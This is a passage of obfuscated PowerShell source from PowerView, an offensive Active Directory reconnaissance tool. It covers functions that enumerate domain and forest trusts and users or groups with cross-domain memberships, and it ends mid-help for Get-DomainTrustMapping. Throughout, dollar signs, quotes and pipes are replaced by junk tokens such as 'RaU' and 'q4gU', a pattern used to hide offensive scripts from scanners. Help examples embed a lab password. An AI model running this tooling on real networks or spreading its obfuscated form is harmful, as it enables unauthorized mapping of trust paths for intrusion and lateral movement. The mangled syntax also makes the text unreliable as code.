        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [Switch]
        RaUTombstone,

        [Alias(q4gUReturnOneq4gU)]
        [Switch]
        RaUFindOne,

        [Parameter(ParameterSetName = q4gULDAPq4gU)]
        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUTrustAttributes = @{
            [uint32]q4gU0x00000001q4gU = q4gUNON_TRANSITIVEq4gU
            [uint32]q4gU0x00000002q4gU = q4gUUPLEVEL_ONLYq4gU
            [uint32]q4gU0x00000004q4gU = q4gUFILTER_SIDSq4gU
            [uint32]q4gU0x00000008q4gU = q4gUFOREST_TRANSITIVEq4gU
            [uint32]q4gU0x00000010q4gU = q4gUCROSS_ORGANIZATIONq4gU
            [uint32]q4gU0x00000020q4gU = q4gUWITHIN_FORESTq4gU
            [uint32]q4gU0x00000040q4gU = q4gUTREAT_AS_EXTERNALq4gU
            [uint32]q4gU0x00000080q4gU = q4gUTRUST_USES_RC4_ENCRYPTIONq4gU
            [uint32]q4gU0x00000100q4gU = q4gUTRUST_USES_AES_KEYSq4gU
            [uint32]q4gU0x00000200q4gU = q4gUCROSS_ORGANIZATION_NO_TGT_DELEGATIONq4gU
            [uint32]q4gU0x00000400q4gU = q4gUPIM_TRUSTq4gU
        }

        RaULdapSearcherArguments = @{}
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaULdapSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gULDAPFilterq4gU]) { RaULdapSearcherArguments[q4gULDAPFilterq4gU] = RaULDAPFilter }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaULdapSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaULdapSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaULdapSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaULdapSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaULdapSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaULdapSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaULdapSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaULdapSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
    }

    PROCESS {
        if (RaUPsCmdlet.ParameterSetName -ne q4gUAPIq4gU) {
            RaUNetSearcherArguments = @{}
            if (RaUDomain -and RaUDomain.Trim() -ne q4gUq4gU) {
                RaUSourceDomain = RaUDomain
            }
            else {
                if (RaUPSBoundParameters[q4gUCredentialq4gU]) {
                    RaUSourceDomain = (Get-Domain -Credential RaUCredential).Name
                }
                else {
                    RaUSourceDomain = (Get-Domain).Name
                }
            }
        }
        elseif (RaUPsCmdlet.ParameterSetName -ne q4gUNETq4gU) {
            if (RaUDomain -and RaUDomain.Trim() -ne q4gUq4gU) {
                RaUSourceDomain = RaUDomain
            }
            else {
                RaUSourceDomain = RaUEnv:USERDNSDOMAIN
            }
        }

        if (RaUPsCmdlet.ParameterSetName -eq q4gULDAPq4gU) {
            # if weq4gUre searching for domain trusts through LDAP/ADSI
            RaUTrustSearcher = Get-DomainSearcher @LdapSearcherArguments
            RaUSourceSID = Get-DomainSID @NetSearcherArguments

            if (RaUTrustSearcher) {

                RaUTrustSearcher.Filter = q4gU(objectClass=trustedDomain)q4gU

                if (RaUPSBoundParameters[q4gUFindOneq4gU]) { RaUResults = RaUTrustSearcher.FindOne() }
                else { RaUResults = RaUTrustSearcher.FindAll() }
                RaUResults wZ5t Where-Object {RaU_} wZ5t ForEach-Object {
                    RaUProps = RaU_.Properties
                    RaUDomainTrust = New-Object PSObject

                    RaUTrustAttrib = @()
                    RaUTrustAttrib += RaUTrustAttributes.Keys wZ5t Where-Object { RaUProps.trustattributes[0] -band RaU_ } wZ5t ForEach-Object { RaUTrustAttributes[RaU_] }

                    RaUDirection = Switch (RaUProps.trustdirection) {
                        0 { q4gUDisabledq4gU }
                        1 { q4gUInboundq4gU }
                        2 { q4gUOutboundq4gU }
                        3 { q4gUBidirectionalq4gU }
                    }

                    RaUTrustType = Switch (RaUProps.trusttype) {
                        1 { q4gUWINDOWS_NON_ACTIVE_DIRECTORYq4gU }
                        2 { q4gUWINDOWS_ACTIVE_DIRECTORYq4gU }
                        3 { q4gUMITq4gU }
                    }

                    RaUDistinguishedname = RaUProps.distinguishedname[0]
                    RaUSourceNameIndex = RaUDistinguishedname.IndexOf(q4gUDC=q4gU)
                    if (RaUSourceNameIndex) {
                        RaUSourceDomain = RaU(RaUDistinguishedname.SubString(RaUSourceNameIndex)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                    }
                    else {
                        RaUSourceDomain = Oj8XOj8X
                    }

                    RaUTargetNameIndex = RaUDistinguishedname.IndexOf(q4gU,CN=Systemq4gU)
                    if (RaUSourceNameIndex) {
                        RaUTargetDomain = RaUDistinguishedname.SubString(3, RaUTargetNameIndex-3)
                    }
                    else {
                        RaUTargetDomain = Oj8XOj8X
                    }

                    RaUObjectGuid = New-Object Guid @(,RaUProps.objectguid[0])
                    RaUTargetSID = (New-Object System.Security.Principal.SecurityIdentifier(RaUProps.securityidentifier[0],0)).Value

                    RaUDomainTrust wZ5t Add-Member Noteproperty q4gUSourceNameq4gU RaUSourceDomain
                    RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTargetNameq4gU RaUProps.name[0]
                    # RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTargetGuidq4gU Oj8X{RaUObjectGuid}Oj8X
                    RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTrustTypeq4gU RaUTrustType
                    RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTrustAttributesq4gU RaU(RaUTrustAttrib -join q4gU,q4gU)
                    RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTrustDirectionq4gU Oj8XRaUDirectionOj8X
                    RaUDomainTrust wZ5t Add-Member Noteproperty q4gUWhenCreatedq4gU RaUProps.whencreated[0]
                    RaUDomainTrust wZ5t Add-Member Noteproperty q4gUWhenChangedq4gU RaUProps.whenchanged[0]
                    RaUDomainTrust.PSObject.TypeNames.Insert(0, q4gUPowerView.DomainTrust.LDAPq4gU)
                    RaUDomainTrust
                }
                if (RaUResults) {
                    try { RaUResults.dispose() }
                    catch {
                        Write-Verbose Oj8X[Get-DomainTrust] Error disposing of the Results object: RaU_Oj8X
                    }
                }
                RaUTrustSearcher.dispose()
            }
        }
        elseif (RaUPsCmdlet.ParameterSetName -eq q4gUAPIq4gU) {
            # if weq4gUre searching for domain trusts through Win32 API functions
            if (RaUPSBoundParameters[q4gUServerq4gU]) {
                RaUTargetDC = RaUServer
            }
            elseif (RaUDomain -and RaUDomain.Trim() -ne q4gUq4gU) {
                RaUTargetDC = RaUDomain
            }
            else {
                # see https://msdn.microsoft.com/en-us/library/ms675976(v=vs.85).aspx for default NULL behavior
                RaUTargetDC = RaUNull
            }

            # arguments for DsEnumerateDomainTrusts
            RaUPtrInfo = [IntPtr]::Zero

            # 63 = DS_DOMAIN_IN_FOREST + DS_DOMAIN_DIRECT_OUTBOUND + DS_DOMAIN_TREE_ROOT + DS_DOMAIN_PRIMARY + DS_DOMAIN_NATIVE_MODE + DS_DOMAIN_DIRECT_INBOUND
            RaUFlags = 63
            RaUDomainCount = 0

            # get the trust information from the target server
            RaUResult = RaUNetapi32::DsEnumerateDomainTrusts(RaUTargetDC, RaUFlags, [ref]RaUPtrInfo, [ref]RaUDomainCount)

            # Locate the offset of the initial intPtr
            RaUOffset = RaUPtrInfo.ToInt64()

            # 0 = success
            if ((RaUResult -eq 0) -and (RaUOffset -gt 0)) {

                # Work out how much to increment the pointer by finding out the size of the structure
                RaUIncrement = RaUDS_DOMAIN_TRUSTS::GetSize()

                # parse all the result structures
                for (RaUi = 0; (RaUi -lt RaUDomainCount); RaUi++) {
                    # create a new int ptr at the given offset and cast the pointer as our result structure
                    RaUNewIntPtr = New-Object System.Intptr -ArgumentList RaUOffset
                    RaUInfo = RaUNewIntPtr -as RaUDS_DOMAIN_TRUSTS

                    RaUOffset = RaUNewIntPtr.ToInt64()
                    RaUOffset += RaUIncrement

                    RaUSidString = q4gUq4gU
                    RaUResult = RaUAdvapi32::ConvertSidToStringSid(RaUInfo.DomainSid, [ref]RaUSidString);RaULastError = [Runtime.InteropServices.Marshal]::GetLastWin32Error()

                    if (RaUResult -eq 0) {
                        Write-Verbose Oj8X[Get-DomainTrust] Error: RaU(([ComponentModel.Win32Exception] RaULastError).Message)Oj8X
                    }
                    else {
                        RaUDomainTrust = New-Object PSObject
                        RaUDomainTrust wZ5t Add-Member Noteproperty q4gUSourceNameq4gU RaUSourceDomain
                        RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTargetNameq4gU RaUInfo.DnsDomainName
                        RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTargetNetbiosNameq4gU RaUInfo.NetbiosDomainName
                        RaUDomainTrust wZ5t Add-Member Noteproperty q4gUFlagsq4gU RaUInfo.Flags
                        RaUDomainTrust wZ5t Add-Member Noteproperty q4gUParentIndexq4gU RaUInfo.ParentIndex
                        RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTrustTypeq4gU RaUInfo.TrustType
                        RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTrustAttributesq4gU RaUInfo.TrustAttributes
                        RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTargetSidq4gU RaUSidString
                        RaUDomainTrust wZ5t Add-Member Noteproperty q4gUTargetGuidq4gU RaUInfo.DomainGuid
                        RaUDomainTrust.PSObject.TypeNames.Insert(0, q4gUPowerView.DomainTrust.APIq4gU)
                        RaUDomainTrust
                    }
                }
                # free up the result buffer
                RaUNull = RaUNetapi32::NetApiBufferFree(RaUPtrInfo)
            }
            else {
                Write-Verbose Oj8X[Get-DomainTrust] Error: RaU(([ComponentModel.Win32Exception] RaUResult).Message)Oj8X
            }
        }
        else {
            # if weq4gUre searching for domain trusts through .NET methods
            RaUFoundDomain = Get-Domain @NetSearcherArguments
            if (RaUFoundDomain) {
                RaUFoundDomain.GetAllTrustRelationships() wZ5t ForEach-Object {
                    RaU_.PSObject.TypeNames.Insert(0, q4gUPowerView.DomainTrust.NETq4gU)
                    RaU_
                }
            }
        }
    }
}


function Get-ForestTrust {
<#
.SYNOPSIS

Return all forest trusts for the current forest or a specified forest.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Forest  

.DESCRIPTION

This function will enumerate domain trust relationships for the current (or a remote)
forest using number of method using the .NET method GetAllTrustRelationships() on a
System.DirectoryServices.ActiveDirectory.Forest returned by Get-Forest.

.PARAMETER Forest

Specifies the forest to query for trusts, defaults to the current forest.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-ForestTrust

Return current forest trusts.

.EXAMPLE

Get-ForestTrust -Forest Oj8Xexternal.localOj8X

Return trusts for the Oj8Xexternal.localOj8X forest.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-ForestTrust -Forest Oj8Xexternal.localOj8X -Credential RaUCred

Return trusts for the Oj8Xexternal.localOj8X forest using the specified alternate credenitals.

.OUTPUTS

PowerView.DomainTrust.NET

A TrustRelationshipInformationCollection returned when using .NET methods (default).
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.ForestTrust.NETq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUNameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUForest,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    PROCESS {
        RaUNetForestArguments = @{}
        if (RaUPSBoundParameters[q4gUForestq4gU]) { RaUNetForestArguments[q4gUForestq4gU] = RaUForest }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUNetForestArguments[q4gUCredentialq4gU] = RaUCredential }

        RaUFoundForest = Get-Forest @NetForestArguments

        if (RaUFoundForest) {
            RaUFoundForest.GetAllTrustRelationships() wZ5t ForEach-Object {
                RaU_.PSObject.TypeNames.Insert(0, q4gUPowerView.ForestTrust.NETq4gU)
                RaU_
            }
        }
    }
}


function Get-DomainForeignUser {
<#
.SYNOPSIS

Enumerates users who are in groups outside of the userq4gUs domain.
This is a domainq4gUs Oj8XoutgoingOj8X access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainUser  

.DESCRIPTION

Uses Get-DomainUser to enumerate all users for the current (or target) domain,
then calculates the given userq4gUs domain name based on the userq4gUs distinguishedName.
This domain name is compared to the queried domain, and the user object is
output if they differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignUser

Return all users in the current domain who are in groups not in the
current domain.

.EXAMPLE

Get-DomainForeignUser -Domain dev.testlab.local

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainForeignUser -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential RaUCred

Return all users in the dev.testlab.local domain who are in groups not in the
dev.testlab.local domain, binding to the secondary.dev.testlab.local for queries, and
using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignUser

Custom PSObject with translated user property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.ForeignUserq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUNameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUSearcherArguments = @{}
        RaUSearcherArguments[q4gULDAPFilterq4gU] = q4gU(memberof=*)q4gU
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        if (RaUPSBoundParameters[q4gURawq4gU]) { RaUSearcherArguments[q4gURawq4gU] = RaURaw }
    }

    PROCESS {
        Get-DomainUser @SearcherArguments  wZ5t ForEach-Object {
            ForEach (RaUMembership in RaU_.memberof) {
                RaUIndex = RaUMembership.IndexOf(q4gUDC=q4gU)
                if (RaUIndex) {

                    RaUGroupDomain = RaU(RaUMembership.SubString(RaUIndex)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                    RaUUserDistinguishedName = RaU_.distinguishedname
                    RaUUserIndex = RaUUserDistinguishedName.IndexOf(q4gUDC=q4gU)
                    RaUUserDomain = RaU(RaU_.distinguishedname.SubString(RaUUserIndex)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU

                    if (RaUGroupDomain -ne RaUUserDomain) {
                        # if the group domain doesnq4gUt match the user domain, display it
                        RaUGroupName = RaUMembership.Split(q4gU,q4gU)[0].split(q4gU=q4gU)[1]
                        RaUForeignUser = New-Object PSObject
                        RaUForeignUser wZ5t Add-Member Noteproperty q4gUUserDomainq4gU RaUUserDomain
                        RaUForeignUser wZ5t Add-Member Noteproperty q4gUUserNameq4gU RaU_.samaccountname
                        RaUForeignUser wZ5t Add-Member Noteproperty q4gUUserDistinguishedNameq4gU RaU_.distinguishedname
                        RaUForeignUser wZ5t Add-Member Noteproperty q4gUGroupDomainq4gU RaUGroupDomain
                        RaUForeignUser wZ5t Add-Member Noteproperty q4gUGroupNameq4gU RaUGroupName
                        RaUForeignUser wZ5t Add-Member Noteproperty q4gUGroupDistinguishedNameq4gU RaUMembership
                        RaUForeignUser.PSObject.TypeNames.Insert(0, q4gUPowerView.ForeignUserq4gU)
                        RaUForeignUser
                    }
                }
            }
        }
    }
}


function Get-DomainForeignGroupMember {
<#
.SYNOPSIS

Enumerates groups with users outside of the groupq4gUs domain and returns
each foreign member. This is a domainq4gUs Oj8XincomingOj8X access.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainGroup  

.DESCRIPTION

Uses Get-DomainGroup to enumerate all groups for the current (or target) domain,
then enumerates the members of each group, and compares the memberq4gUs domain
name to the parent groupq4gUs domain name, outputting the member if the domains differ.

.PARAMETER Domain

Specifies the domain to use for the query, defaults to the current domain.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER SecurityMasks

Specifies an option for examining security information of a directory object.
One of q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainForeignGroupMember

Return all group members in the current domain where the group and member differ.

.EXAMPLE

Get-DomainForeignGroupMember -Domain dev.testlab.local

Return all group members in the dev.testlab.local domain where the member is not in dev.testlab.local.

.EXAMPLE

RaUSecPassword = ConvertTo-SecureString q4gUPassword123!q4gU -AsPlainText -Force
RaUCred = New-Object System.Management.Automation.PSCredential(q4gUTESTLABScKjdfm.aq4gU, RaUSecPassword)
Get-DomainForeignGroupMember -Domain dev.testlab.local -Server secondary.dev.testlab.local -Credential RaUCred

Return all group members in the dev.testlab.local domain where the member is
not in dev.testlab.local. binding to the secondary.dev.testlab.local for
queries, and using the specified alternate credentials.

.OUTPUTS

PowerView.ForeignGroupMember

Custom PSObject with translated group member property fields.
#>

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute(q4gUPSShouldProcessq4gU, q4gUq4gU)]
    [OutputType(q4gUPowerView.ForeignGroupMemberq4gU)]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = RaUTrue, ValueFromPipelineByPropertyName = RaUTrue)]
        [Alias(q4gUNameq4gU)]
        [ValidateNotNullOrEmpty()]
        [String]
        RaUDomain,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUFilterq4gU)]
        [String]
        RaULDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        RaUProperties,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUADSPathq4gU)]
        [String]
        RaUSearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias(q4gUDomainControllerq4gU)]
        [String]
        RaUServer,

        [ValidateSet(q4gUBaseq4gU, q4gUOneLevelq4gU, q4gUSubtreeq4gU)]
        [String]
        RaUSearchScope = q4gUSubtreeq4gU,

        [ValidateRange(1, 10000)]
        [Int]
        RaUResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        RaUServerTimeLimit,

        [ValidateSet(q4gUDaclq4gU, q4gUGroupq4gU, q4gUNoneq4gU, q4gUOwnerq4gU, q4gUSaclq4gU)]
        [String]
        RaUSecurityMasks,

        [Switch]
        RaUTombstone,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        RaUCredential = [Management.Automation.PSCredential]::Empty
    )

    BEGIN {
        RaUSearcherArguments = @{}
        RaUSearcherArguments[q4gULDAPFilterq4gU] = q4gU(member=*)q4gU
        if (RaUPSBoundParameters[q4gUDomainq4gU]) { RaUSearcherArguments[q4gUDomainq4gU] = RaUDomain }
        if (RaUPSBoundParameters[q4gUPropertiesq4gU]) { RaUSearcherArguments[q4gUPropertiesq4gU] = RaUProperties }
        if (RaUPSBoundParameters[q4gUSearchBaseq4gU]) { RaUSearcherArguments[q4gUSearchBaseq4gU] = RaUSearchBase }
        if (RaUPSBoundParameters[q4gUServerq4gU]) { RaUSearcherArguments[q4gUServerq4gU] = RaUServer }
        if (RaUPSBoundParameters[q4gUSearchScopeq4gU]) { RaUSearcherArguments[q4gUSearchScopeq4gU] = RaUSearchScope }
        if (RaUPSBoundParameters[q4gUResultPageSizeq4gU]) { RaUSearcherArguments[q4gUResultPageSizeq4gU] = RaUResultPageSize }
        if (RaUPSBoundParameters[q4gUServerTimeLimitq4gU]) { RaUSearcherArguments[q4gUServerTimeLimitq4gU] = RaUServerTimeLimit }
        if (RaUPSBoundParameters[q4gUSecurityMasksq4gU]) { RaUSearcherArguments[q4gUSecurityMasksq4gU] = RaUSecurityMasks }
        if (RaUPSBoundParameters[q4gUTombstoneq4gU]) { RaUSearcherArguments[q4gUTombstoneq4gU] = RaUTombstone }
        if (RaUPSBoundParameters[q4gUCredentialq4gU]) { RaUSearcherArguments[q4gUCredentialq4gU] = RaUCredential }
        if (RaUPSBoundParameters[q4gURawq4gU]) { RaUSearcherArguments[q4gURawq4gU] = RaURaw }
    }

    PROCESS {
        # standard group names to ignore
        RaUExcludeGroups = @(q4gUUsersq4gU, q4gUDomain Usersq4gU, q4gUGuestsq4gU)

        Get-DomainGroup @SearcherArguments wZ5t Where-Object { RaUExcludeGroups -notcontains RaU_.samaccountname } wZ5t ForEach-Object {
            RaUGroupName = RaU_.samAccountName
            RaUGroupDistinguishedName = RaU_.distinguishedname
            RaUGroupDomain = RaUGroupDistinguishedName.SubString(RaUGroupDistinguishedName.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU

            RaU_.member wZ5t ForEach-Object {
                # filter for foreign SIDs in the cn field for users in another domain,
                #   or if the DN doesnq4gUt end with the proper DN for the queried domain
                RaUMemberDomain = RaU_.SubString(RaU_.IndexOf(q4gUDC=q4gU)) -replace q4gUDC=q4gU,q4gUq4gU -replace q4gU,q4gU,q4gU.q4gU
                if ((RaU_ -match q4gUCN=S-1-5-21.*-.*q4gU) -or (RaUGroupDomain -ne RaUMemberDomain)) {
                    RaUMemberDistinguishedName = RaU_
                    RaUMemberName = RaU_.Split(q4gU,q4gU)[0].split(q4gU=q4gU)[1]

                    RaUForeignGroupMember = New-Object PSObject
                    RaUForeignGroupMember wZ5t Add-Member Noteproperty q4gUGroupDomainq4gU RaUGroupDomain
                    RaUForeignGroupMember wZ5t Add-Member Noteproperty q4gUGroupNameq4gU RaUGroupName
                    RaUForeignGroupMember wZ5t Add-Member Noteproperty q4gUGroupDistinguishedNameq4gU RaUGroupDistinguishedName
                    RaUForeignGroupMember wZ5t Add-Member Noteproperty q4gUMemberDomainq4gU RaUMemberDomain
                    RaUForeignGroupMember wZ5t Add-Member Noteproperty q4gUMemberNameq4gU RaUMemberName
                    RaUForeignGroupMember wZ5t Add-Member Noteproperty q4gUMemberDistinguishedNameq4gU RaUMemberDistinguishedName
                    RaUForeignGroupMember.PSObject.TypeNames.Insert(0, q4gUPowerView.ForeignGroupMemberq4gU)
                    RaUForeignGroupMember
                }
            }
        }
    }
}


function Get-DomainTrustMapping {
<#
.SYNOPSIS

This function enumerates all trusts for the current domain and then enumerates
all trusts for each domain it finds.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-Domain, Get-DomainTrust, Get-ForestTrust  

.DESCRIPTION

This function will enumerate domain trust relationships for the current domain using
a number of methods, and then enumerates all trusts for each found domain, recursively
mapping all reachable trust relationships. By default, and LDAP search using the filter
q4gU(objectClass=trustedDomain)q4gU is used- if any LDAP-appropriate parameters are specified
LDAP is used as well. If the -NET flag is specified, the .NET method
GetAllTrustRelationships() is used on the System.DirectoryServices.ActiveDirectory.Domain
object. If the -API flag is specified, the Win32 API DsEnumerateDomainTrusts() call is
used to enumerate instead. If any 

.PARAMETER API

Switch. Use an API call (DsEnumerateDomainTrusts) to enumerate the trusts instead of the
built-in LDAP method.

.PARAMETER NET

Switch. Use .NET queries to enumerate trusts instead of the default LDAP method.

.PARAMETER LDAPFilter

Specifies an LDAP query string that is used to filter Active Directory objects.

.PARAMETER Properties

Specifies the properties of the output object to retrieve from the server.

.PARAMETER SearchBase

The LDAP source to search through, e.g. Oj8XLDAP://OU=secret,DC=testlab,DC=localOj8X
Useful for OU queries.

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Specifies the PageSize to set for the LDAP searcher object.

.PARAMETER ServerTimeLimit

Specifies the maximum amount of time the server spends searching. Default of 120 seconds.

.PARAMETER Tombstone

Switch. Specifies that the searcher should also return deleted/tombstoned objects.

.PARAMETER Credential

A [Management.Automation.PSCredential] object of alternate credentials
for connection to the target domain.

.EXAMPLE

Get-DomainTrustMapping wZ5t Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using .NET methods and output everything to a .csv file.

.EXAMPLE

Get-DomainTrustMapping -API wZ5t Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using Win32 API calls and output everything to a .csv file.

.EXAMPLE

Get-DomainTrustMapping -NET wZ5t Export-CSV -NoTypeInformation trusts.csv

Map all reachable domain trusts using .NET methods and output everything to a .csv file.

.EXAMPLE

